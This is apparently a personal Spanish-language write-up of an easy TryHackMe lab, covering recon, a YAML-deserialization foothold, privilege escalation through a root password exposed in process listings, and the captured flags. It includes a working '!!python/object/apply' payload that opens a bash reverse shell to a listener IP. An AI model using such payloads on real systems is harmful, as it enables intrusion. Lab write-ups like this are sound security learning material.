---
title: Try hack me- Beach bar
date: YYYY-MM-DD
platform: Try Hack Me
difficulty: Easy
os: Linux
tags:
  - YAML
status: Completada
---

# Resumen Ejecutivo
**IP Objetivo:** `10.64.177.23`
**Descripción breve:** 

---

## 1. Information Gathering (Reconocimiento)

### Escaneo de Puertos con [[Nmap]]
```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv 10.64.177.23 -n -Pn -oG escaneo
```

**Puertos Abiertos:**
- No encontre puertos abiertos, sin embargo intente colocar la ip en una url y salio una pagina web

---

## 2. Vulnerability Assessment (Análisis de Vulnerabilidades)
- Al intentar entrar hay un login, hardcodeado está el usuario y contraseña para entrar
- En un panel hay una parte donde colocar código [[YAML]] para insertar datos en la página, podemos probar si sanitiza los datos
- El backend parsea el YAML con un loader inseguro (`yaml.load`) en lugar de `yaml.safe_load()`, lo que permite **inyección YAML / deserialización insegura** → [[RCE]]

---

## 3. Exploitation (Acceso Inicial)

### Metodología
1. Evaluamos el campo donde subir o colocar código YAML
2. Probamos a ver si podemos insertar código que nos devuelva una [[Reverse Shell]] a nuestra pc que escucha con netcat
3. Usamos el tag `!!python/object/apply` para ejecutar comandos arbitrarios en el servidor
4. Al entrar conseguimos la primera flag

### Ejecución
```bash
nc -lvnp 4444
```

```yaml
!!python/object/apply:subprocess.check_output [["bash","-c","bash -i >& /dev/tcp/192.168.144.135/4444 0>&1"]]
```

**Prueba de acceso (User Flag):**
```bash
THM{y4ml_pl4yl1st_pwns_th3_b34ch
```

---

## 4. Privilege Escalation ([[Escaladas de privilegios]])

### Enumeración Interna
- 

### Explotación Local
1. Utilizamos el comando para buscar procesos en segundo plano de usuarios nos encontramos con una linea que revebala la contrase;a de root
2. [[Escaladas de privilegios#Buscar otros usuarios para ver que procesos hay|procesos]]
3. 

### Ejecución
```bash
ps aux | grep jukebox
```

**Prueba de acceso (Root/SYSTEM Flag):**
```bash
THM{cr3d3nt14l_r3us3_4t_th3_b34ch_b4r}
```

---
